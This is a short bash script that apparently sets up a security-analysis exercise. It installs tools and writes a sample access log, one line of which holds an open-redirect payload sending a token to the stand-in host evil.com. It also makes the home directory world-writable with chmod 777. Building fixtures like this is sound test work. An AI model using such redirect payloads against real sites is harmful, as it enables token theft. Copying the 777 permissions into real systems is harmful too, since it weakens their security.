#!/bin/bash
set -e
export DEBIAN_FRONTEND=noninteractive
    apt-get update && apt-get install -y python3 python3-pip xxd bc iptables
    pip3 install pytest

    mkdir -p /home/user

    cat << 'EOF' > /home/user/access.log
192.168.1.50 - [10/Oct/2023:13:55:36 -0700] "GET /login?redirect=/dashboard HTTP/1.1" 200
198.51.100.42 - [10/Oct/2023:14:02:11 -0700] "GET /login?redirect=http://evil.com/steal?token=7a6e6f7364687e78697e7f640202 HTTP/1.1" 302
203.0.113.15 - [10/Oct/2023:14:15:00 -0700] "GET /login?redirect=/profile HTTP/1.1" 200
EOF

    chmod 644 /home/user/access.log

    useradd -m -s /bin/bash user || true
    chmod -R 777 /home/user
